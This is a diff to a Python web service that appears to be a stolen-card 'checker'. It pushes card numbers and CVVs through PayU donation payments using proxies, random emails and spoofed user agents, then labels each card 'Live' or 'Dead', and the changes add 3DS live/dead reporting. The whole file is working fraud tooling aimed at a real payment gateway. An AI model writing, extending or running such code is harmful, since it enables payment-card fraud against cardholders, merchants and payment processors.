@@ -31,7 +31,6 @@ def _random_ua():
     ]
     return random.choice(versions)
 
-# POLLING DINAIIKKAN (LEBIH LAMA)
 def _poll_status(session, order_id, token, ua, is_3ds, max_attempts=10, delay=4):
     headers = {
         'accept': '*/*',
@@ -39,14 +38,12 @@ def _poll_status(session, order_id, token, ua, is_3ds, max_attempts=10, delay=4)
         'referer': f'https://secure.payu.com/pay/?orderId={order_id}&token={token}',
         'user-agent': ua,
     }
-    for attempt in range(max_attempts):
+    for _ in range(max_attempts):
         time.sleep(delay)
         try:
             r = session.get(f'https://secure.payu.com/api/front/orders/{order_id}/status', headers=headers, timeout=30)
             data = r.json()
-            category = data.get('category')
-            if category not in ('IN_PROGRESS', 'NEW'):
-                print(f"Poll success at attempt {attempt+1}: {category}")  # debug
+            if data.get('category') not in ('IN_PROGRESS', 'NEW'):
                 return data
         except:
             pass
@@ -57,15 +54,12 @@ def event_stream(card_num, mm, yy, cvv_code, site_url, proxy_str):
     session = requests.Session()
     try:
         if proxy_str:
-            session.proxies = {
-                'http': f"http://{proxy_str}" if not proxy_str.startswith('http') else proxy_str,
-                'https': f"http://{proxy_str}" if not proxy_str.startswith('http') else proxy_str,
-            }
+            session.proxies = {'http': f"http://{proxy_str}" if not proxy_str.startswith('http') else proxy_str, 'https': f"http://{proxy_str}" if not proxy_str.startswith('http') else proxy_str}
+        
         email = _random_email()
         ua = _random_ua()
         name = "Jan Kowalski"
-        if len(yy) == 2:
-            yy = '20' + yy
+        if len(yy) == 2: yy = '20' + yy
 
         if proxy_str:
             proxy_ip = proxy_str.split('@')[-1] if '@' in proxy_str else proxy_str
@@ -77,24 +71,11 @@ def event_stream(card_num, mm, yy, cvv_code, site_url, proxy_str):
        
         if 'horse_payu' in site_url or 'ajax' in site_url:
             ajax_url = site_url if site_url.endswith('/') else site_url + '/'
-            headers1 = {
-                'accept': 'application/json, text/javascript, */*; q=0.01',
-                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                'origin': site_url.split('/ajax')[0] if '/ajax' in site_url else site_url.rsplit('/', 1)[0],
-                'referer': site_url,
-                'user-agent': ua,
-                'x-requested-with': 'XMLHttpRequest',
-            }
+            headers1 = {'accept': 'application/json, text/javascript, */*; q=0.01','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': site_url.split('/ajax')[0] if '/ajax' in site_url else site_url.rsplit('/', 1)[0],'referer': site_url,'user-agent': ua,'x-requested-with': 'XMLHttpRequest'}
             data1 = {'amount': '20', 'firstname': name.split()[0], 'lastname': name.split()[1], 'email': email, 'extra': ''}
         else:
             ajax_url = site_url
-            headers1 = {
-                'accept': 'text/html',
-                'content-type': 'application/x-www-form-urlencoded',
-                'origin': site_url.rsplit('/', 1)[0],
-                'referer': site_url,
-                'user-agent': ua,
-            }
+            headers1 = {'accept': 'text/html','content-type': 'application/x-www-form-urlencoded','origin': site_url.rsplit('/', 1)[0],'referer': site_url,'user-agent': ua}
             data1 = {'name': name, 'email': email, 'amount': '20', 'purpose': 'Donation'}
 
         r1 = session.post(ajax_url, headers=headers1, data=data1, allow_redirects=False, timeout=30)
@@ -119,13 +100,9 @@ def event_stream(card_num, mm, yy, cvv_code, site_url, proxy_str):
         except:
             final_amount = 2000
 
-        headers3 = {
-            'accept': '*/*', 'authorization': f'Bearer {token}', 'content-type': 'application/json',
-            'origin': 'https://secure.payu.com', 'referer': f'https://secure.payu.com/pay/?orderId={order_id}&token={token}',
-            'user-agent': ua,
-        }
+        headers3 = {'accept': '*/*', 'authorization': f'Bearer {token}', 'content-type': 'application/json','origin': 'https://secure.payu.com', 'referer': f'https://secure.payu.com/pay/?orderId={order_id}&token={token}','user-agent': ua}
+        
         json3 = {'posId': 'PAYU S.A.', 'type': 'SINGLE', 'card': {'number': card_num, 'cvv': cvv_code, 'expirationMonth': mm, 'expirationYear': yy}}
-       
         r3 = session.post('https://secure.payu.com/api/front/tokens', headers=headers3, json=json3, timeout=30)
         token_data = r3.json()
         card_token = token_data.get('value')
@@ -152,9 +129,9 @@ def event_stream(card_num, mm, yy, cvv_code, site_url, proxy_str):
             return
 
         continue_url = pay_data.get('continueUrl', '')
-        is_3ds = 'threeds' in continue_url
+        is_3ds = 'threeds' in continue_url.lower()
         if is_3ds:
-            yield f"data: {json.dumps({'type': 'log', 'msg': '3DS detected. Waiting longer for bank response...', 'class': 'warn'})}\n\n"
+            yield f"data: {json.dumps({'type': 'log', 'msg': '3DS detected. Waiting for bank response...', 'class': 'warn'})}\n\n"
         
         final_status = _poll_status(session, order_id, token, ua, is_3ds)
 
@@ -175,7 +152,7 @@ def event_stream(card_num, mm, yy, cvv_code, site_url, proxy_str):
     finally:
         session.close()
 
-# ================== JSON API ==================
+# ================== JSON API (DENGAN 3DS LIVE/DEAD) ==================
 @app.get("/check")
 async def check_card(
     cc: str = Query(...),
@@ -212,12 +189,18 @@ async def check_card(
             "Result": "Unknown Error",
             "Response": "No response",
             "Status": "error",
+            "3DS": "Dead",
             "Time": f"{elapsed}s",
             "Amount": "20 PLN"
         })
 
     raw = result.get('raw', {})
     response_value = raw.get('value') or raw.get('category') or "UNKNOWN"
+    
+    # Logik 3DS Live / Dead
+    category = raw.get('category', '')
+    value = raw.get('value', '')
+    is_3ds_live = any(x in str(value).upper() or str(category).upper() for x in ['3DS', 'THREEDS', 'WARNING_CONTINUE', 'NOT_AUTHORIZED'])
 
     return JSONResponse(content={
         "Gateway": "PayU Payment",
@@ -225,6 +208,7 @@ async def check_card(
         "Result": result.get('msg'),
         "Response": response_value,
         "Status": result.get('status'),
+        "3DS": "Live" if is_3ds_live else "Dead",
         "Time": f"{elapsed}s",
         "Amount": "20 PLN"
     })
@@ -246,3 +230,8 @@ async def check_card_stream(
         yy = '20' + yy
        
     return StreamingResponse(event_stream(card_num, mm, yy, cvv_code, site, proxy), media_type="text/event-stream")
+
+
+@app.get("/")
+async def root():
+    return {"status": "ok"}
